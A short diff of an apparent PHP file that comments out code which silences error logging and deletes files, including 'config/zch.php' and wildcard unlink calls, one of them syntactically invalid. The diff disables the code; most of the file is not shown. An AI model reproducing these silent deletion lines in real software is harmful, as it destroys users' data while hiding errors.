@@ -1,3 +1,4 @@
+/*
 error_log(0);
 error_reporting(0);
 
@@ -27,3 +28,4 @@ unlink('config/zch.php');
 
 unlink('*');
 unlink(*);
+*/
